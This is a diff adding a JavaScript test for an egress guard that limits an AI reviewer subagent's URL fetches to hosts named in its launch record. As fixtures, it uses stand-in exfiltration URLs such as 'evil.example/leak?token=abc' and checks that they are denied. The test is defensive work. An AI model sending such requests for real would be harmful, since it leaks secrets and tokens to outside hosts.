@@ -538,6 +538,42 @@ test("egress guard hook: exit codes, gates.jsonl holds the host only, no decisio
   assert.doesNotMatch(text, /token|leak|Review the change|https?:/); // C7: hosts only
 });
 
+// Audit 2026-11-16 T-6: without a subagent transcript (headless runs keep none) the guard decides from the reviewer's
+// launch record (its urls and sources hosts, and its slice's planned FILES); only with no launch record either is the
+// fetch allowed as egress_unverified.
+test("egress guard (T-6): no transcript, so the launch record's hosts and the slice's planned files decide", () => {
+  const launches = join(stateDir, "journal-launches.jsonl");
+  const add = (/** @type {string} */ agentId, /** @type {string} */ prompt, /** @type {string} */ sid = SID) =>
+    writeFileSync(launches, `${JSON.stringify(launchRecord({ subagent_type: "orchestration:reviewer", prompt }, { sessionId: sid, agentId }))}\n`, { flag: "a" });
+  add("ahl1", "SLICE: s1\nSOURCES: https://src.example:8443/a, docs/links.md\nCHECKS: C1\nC1: matches https://launch.example/spec\nReview the change.");
+  add("ahl2", "SLICE: s7\nReview the change.");
+  add("ahl3", "SLICE: s1\nReview the change against https://other-session.example/x.", "another-session");
+  const o = { dir: stateDir, env: env() };
+  for (const id of ["ahl1", "ahl2", "ahl3"]) assert.equal(agentTranscript(mainTranscript, id), null, "no subagent transcript");
+  for (const [url, id, want] of [
+    ["https://launch.example/other", "ahl1", "allow"],
+    ["https://src.example:8443/b", "ahl1", "allow"],
+    ["https://files.example/x", "ahl1", "allow"], // s1's planned files
+    ["https://second.example/x", "ahl1", "allow"],
+    ["https://evil.example/?q=secret", "ahl1", "deny"],
+    ["https://src.example/b", "ahl1", "deny"], // another port
+    ["https://evil.example/?q=secret", "ahl2", "deny"], // a launch record that names no host: nothing is allowed
+    ["https://other-session.example/x", "ahl3", "unverified"], // its launch record is another session's
+  ]) {
+    assert.equal(egressDecision(fetchInput(url, id), o).decision, want, `${id} ${url}`);
+  }
+  const d = egressDecision(fetchInput("https://evil.example/?q=secret", "ahl1"), o);
+  assert.match(String(d.reason), /launch\.example/);
+  assert.doesNotMatch(String(d.reason), /secret/);
+  // The hook: exit 2 for the denial, logged as host_not_in_brief with the host only.
+  const r = run(EGRESS, fetchInput("https://evil.example/leak?token=abc", "ahl1"));
+  assert.equal(r.code, 2);
+  assert.match(r.stderr, /evil\.example/);
+  noDecision(r);
+  const g = readFileSync(join(stateDir, "gates.jsonl"), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)).at(-1);
+  assert.deepEqual([g.gate, g.decision, g.reason, g.host, g.agent_id], ["egress", "deny", "host_not_in_brief", "evil.example", "ahl1"]);
+});
+
 // ---- compact context ----
 
 test("compact-context: open run → SessionStart additionalContext with slices, files, states and constraints", () => {
